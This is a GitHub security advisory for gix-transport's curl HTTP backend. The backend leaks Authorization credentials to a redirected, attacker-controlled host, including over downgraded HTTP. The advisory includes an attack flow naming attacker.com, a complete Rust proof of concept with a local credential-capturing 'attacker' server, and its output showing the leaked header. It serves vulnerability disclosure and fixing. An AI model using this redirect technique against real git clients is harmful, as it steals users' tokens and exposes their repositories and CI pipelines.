# [M] gix-transport: HTTP credentials leaked to redirected host in curl backend

## Summary
Severity: Medium
Advisory: GHSA-9857-6mw7-fq2m
CWE: CWE-522
Ecosystem: crates.io
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-05-05
Source: https://github.com/advisories/GHSA-9857-6mw7-fq2m
Type: github-advisory

## Affected
- crates.io: `gix-transport` — affected >=0.25.4 <0.56.0

## Details
## Summary

The curl-based HTTP transport in `gix-transport` sends user credentials (passwords, tokens) to an attacker-controlled server after an HTTP redirect. When a server responds with a 302 redirect during the initial `GET /info/refs`, gitoxide records the redirected base URL and rewrites all subsequent requests to point at the redirected host. The `Authorization` header is still attached because `add_basic_auth_if_present()` only checks `self.url` (the original, never-updated URL).

The reqwest backend is not affected. Its custom redirect policy at `reqwest/remote.rs` lines 60-64 compares `prev_url.host_str()` to `curr_url.host_str()` and calls `attempt.stop()` on cross-domain redirects, so `redirected_base_url` is never set to a different host.

## Details

The vulnerability involves two components in `gix-transport`:

**1. URL rewriting after redirect** ([gix-transport/src/client/blocking_io/http/curl/remote.rs](https://github.com/GitoxideLabs/gitoxide/blob/main/gix-transport/src/client/blocking_io/http/curl/remote.rs))

After a request completes, the effective URL is compared to the requested URL. If they differ (redirect occurred), the new base URL is stored (lines 355-359). On subsequent requests, `swap_tails()` rewrites the target URL to point at the redirected host (line 166).

**2. Credential check uses original URL** ([gix-transport/src/client/blocking_io/http/mod.rs, lines 293-312](https://github.com/GitoxideLabs/gitoxide/blob/main/gix-transport/src/client/blocking_io/http/mod.rs#L293))

`add_basic_auth_if_present()` checks `self.url` (set once during construction, never mutated) to decide whether to attach credentials. Since `self.url` always points to the original host, credentials are approved even when the actual request goes to the redirected (attacker) host.

The `Authorization` header is added to the headers list in `handshake()` (line 374) and `request()` (line 434) before being passed to the backend, which applies them to the rewritten URL via `handle.http_headers(headers)` (line 309).

### Attack flow: cross-domain credential leak

1. Victim clones `https://legitimate.com/repo` with credentials configured
2. Server returns 302 redirect on `GET /info/refs` to `https://attacker.com/...`
3. Curl follows the redirect and strips `Authorization` for this GET (safe so far)
4. Attacker serves a valid info/refs response; `redirected_base_url` is set
5. `POST /git-upload-pack` is rewritten via `swap_tails()` to `attacker.com`
6. `add_basic_auth_if_present()` checks `self.url` (still `legitimate.com`), approves credential sending
7. `Authorization: Basic <credentials>` is sent to `attacker.com`

Curl's cross-domain header stripping only protects the redirected GET. It does not protect the POST, which is a new request with credentials re-attached by gitoxide.

### Secondary vector: HTTPS-to-HTTP downgrade

The cleartext protection at `mod.rs` line 300-305 also checks `self.url`:

```rust
if self.url.starts_with("http://") {
    return Err(client::Error::AuthenticationRefused("..."));
}
```

This only validates the original URL's scheme, not the effective URL after redirect. A redirect from `https://legitimate.com` to `http://attacker.com` bypasses this check, causing credentials to be sent in cleartext over HTTP.

1. Victim clones `https://legitimate.com/repo` with credentials
2. Server redirects to `http://attacker.com/...` (note: HTTP, not HTTPS)
3. `add_basic_auth_if_present()` checks `self.url` (still `https://`), allows credentials
4. `Authorization` header is sent over unencrypted HTTP to `attacker.com`

## PoC

A complete Rust project that reproduces the issue. It starts two local TCP servers (legitimate on :8080, attacker on :9090) and uses `gix-transport` to demonstrate the credential leak.

**To run:** Create the project next to the gitoxide checkout so path dependencies resolve, then `cargo run`.

<details>
<summary>Cargo.toml</summary>

```toml
[package]
name = "poc-gitoxide-redirect"
version = "0.1.0"
edition = "2021"

[dependencies]
# http-client-insecure-credentials is only needed because the PoC uses http://
# to avoid TLS setup. A real attack would use https:// and not require this feature.
gix-transport = { path = "../gitoxide/gix-transport", features = ["http-client-curl", "http-client-insecure-credentials"] }
gix-sec = { path = "../gitoxide/gix-sec" }
gix-url = { path = "../gitoxide/gix-url" }
gix-packetline = { path = "../gitoxide/gix-packetline", features = ["blocking-io"] }
```

</details>

<details>
<summary>src/main.rs</summary>

```rust
use std::io::{BufRead, BufReader, Write};
use std::net::TcpListener;
use std::sync::mpsc;
use std::thread;

use gix_transport::client::{self, blocking_io::http, blocking_io::Transport, TransportWithoutIO};

fn main() {
    println!("=== gitoxide HTTP credential leak via redirect ===\n");

    let (captured_tx, captured_rx) = mpsc::channel::<Vec<String>>();

    // Attacker server (port 9090): captures credentials
    let attacker = TcpListener::bind("127.0.0.1:9090").expect("bind attacker");
    let attacker_handle = thread::spawn(move || {
        let (mut conn1, _) = attacker.accept().expect("accept conn1");
        let mut reader1 = BufReader::new(conn1.try_clone().unwrap());
        let mut headers1 = Vec::new();
        loop {
            let mut line = String::new();
            reader1.read_line(&mut line).unwrap();
            if line.trim().is_empty() { break; }
            headers1.push(line.trim().to_string());
        }
        println!("[attacker] GET /info/refs headers (from redirect):");
        for h in &headers1 { println!("  {h}"); }

        let pkt_service = "001e# service=git-upload-pack\n";
        let pkt_flush = "0000";
        let fake_hash = "a".repeat(40);
        let caps = "multi_ack thin-pack side-band side-band-64k ofs-delta shallow no-progress include-tag";
        let ref_line = format!("{fake_hash} HEAD\0{caps}\n");
        let ref_pkt = format!("{:04x}{ref_line}", ref_line.len() + 4);
        let body = format!("{pkt_service}{pkt_flush}{ref_pkt}{pkt_flush}");
        let response = format!(
            "HTTP/1.1 200 OK\r\nContent-Type: application/x-git-upload-pack-advertisement\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
            body.len()
        );
        conn1.write_all(response.as_bytes()).unwrap();
        conn1.flush().unwrap();
        drop(conn1);

        let (mut conn2, _) = attacker.accept().expect("accept conn2");
        let mut reader2 = BufReader::new(conn2.try_clone().unwrap());
        let mut headers2 = Vec::new();
        let mut content_length: usize = 0;
        loop {
            let mut line = String::new();
            reader2.read_line(&mut line).unwrap();
            if line.trim().is_empty() { break; }
            let trimmed = line.trim().to_string();
            if let Some(cl) = trimmed.strip_prefix("Content-Length: ") {
                content_length = cl.parse().unwrap_or(0);
            }
            headers2.push(trimmed);
        }
        if content_length > 0 {
            let mut body_buf = vec![0u8; content_length];
            use std::io::Read;
            reader2.read_exact(&mut body_buf).ok();
        }

        println!("\n[attacker] POST /git-upload-pack headers:");
        for h in &headers2 {
            let prefix = if h.starts_with("Authorization:") { "  >>> LEAKED: " } else { "  " };
            println!("{prefix}{h}");
        }

        let resp_body = "0000";
        let response2 = format!(
            "HTTP/1.1 200 OK\r\nContent-Type: application/x-git-upload-pack-result\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{resp_body}",
            resp_body.len()
        );
        conn2.write_all(response2.as_bytes()).unwrap();
        conn2.flush().unwrap();
        drop(conn2);

        captured_tx.send(headers2).ok();
    });

    // Legitimate server (port 8080): redirects to attacker
    let legit = TcpListener::bind("127.0.0.1:8080").expect("bind legit");
    let legit_handle = thread::spawn(move || {
        let (mut conn, _) = legit.accept().expect("accept legit");
        let mut reader = BufReader::new(conn.try_clone().unwrap());
        let mut request_line = String::new();
        reader.read_line(&mut request_line).unwrap();
        println!("[legit] Received: {}", request_line.trim());
        loop {
            let mut line = String::new();
            reader.read_line(&mut line).unwrap();
            if line.trim().is_empty() { break; }
        }
        let redirect_url = "http://127.0.0.1:9090/repo.git/info/refs?service=git-upload-pack";
        let response = format!(
            "HTTP/1.1 302 Found\r\nLocation: {redirect_url}\r\nContent-Length: 0\r\n\r\n"
        );
        conn.write_all(response.as_bytes()).unwrap();
        conn.flush().unwrap();
        println!("[legit] Sent 302 redirect to attacker server");
    });

    thread::sleep(std::time::Duration::from_millis(100));

    println!("\n[client] Connecting to http://127.0.0.1:8080/repo.git with credentials...");
    let url: gix_url::Url = "http://127.0.0.1:8080/repo.git".try_into().expect("parse url");
    let mut transport: http::Transport<http::curl::Curl> =
        http::connect(url, gix_transport::Protocol::V1, false);
    transport
        .set_identity(gix_sec::identity::Account {
            username: "victim-user".into(),
            password: "super-secret-token".into(),
            oauth_refresh_token: None,
        })
        .expect("set identity");

    println!("[client] Performing handshake (GET /info/refs)...");
    match transport.handshake(gix_transport::Service::UploadPack, &[]) {
        Ok(_) => println!("[client] Handshake succeeded"),
        Err(e) => println!("[client] Handshake error: {e}"),
    }

    println!("[client] Sending request (POST /git-upload-pack)...");
    match transport.request(client::WriteMode::Binary, client::MessageKind::Flush, false) {
        Ok(_writer) => println!("[client] Request sent"),
        Err(e) => println!("[client] Request error: {e}"),
    }

    legit_handle.join().ok();
    attacker_handle.join().ok();

    println!("\n=== RESULT ===");
    if let Ok(headers) = captured_rx.recv_timeout(std::time::Duration::from_secs(2)) {
        let leaked = headers.iter().any(|h| h.starts_with("Authorization:"));
        if leaked {
            let auth = headers.iter().find(|h| h.starts_with("Authorization:")).unwrap();
            println!("VULNERABLE: Credentials leaked to attacker server!");
            println!("Captured: {auth}");
        } else {
            println!("NOT VULNERABLE: No credentials captured.");
        }
    } else {
        println!("ERROR: Timed out.");
    }
}
```

</details>

**Output:**

```
[attacker] GET /info/refs headers (from redirect):
  GET /repo.git/info/refs?service=git-upload-pack HTTP/1.1
  Host: 127.0.0.1:9090
  Accept: */*
  User-Agent: git/oxide-0.55.0

[attacker] POST /git-upload-pack headers:
  POST /repo.git/git-upload-pack HTTP/1.1
  Host: 127.0.0.1:9090
  >>> LEAKED: Authorization: Basic dmljdGltLXVzZXI6c3VwZXItc2VjcmV0LXRva2Vu

VULNERABLE: Credentials leaked to attacker server!
Captured: Authorization: Basic dmljdGltLXVzZXI6c3VwZXItc2VjcmV0LXRva2Vu
```

The GET (from redirect) has no `Authorization` header. The POST carries the full credentials. The base64 decodes to `victim-user:super-secret-token`.

## Impact

Any user who clones or fetches over HTTP(S) using gitoxide with the curl backend (`http-client-curl` feature) can have their credentials stolen by an attacker who controls a redirect target (via compromised server, DNS hijacking, or MITM). The only user interaction required is initiating the clone or fetch; the redirect and credential leak happen transparently. CI/CD pipelines using tokens are also at risk.

## Suggested Fix

1. Only attach `Authorization` if the effective URL's host matches the original URL's host.
2. Or block cross-origin redirects in the curl backend, matching reqwest's behavior.
3. Check the effective URL's scheme (not the original) for the HTTPS-to-HTTP downgrade.

## References
- https://github.com/GitoxideLabs/gitoxide/security/advisories/GHSA-9857-6mw7-fq2m
- https://github.com/GitoxideLabs/gitoxide
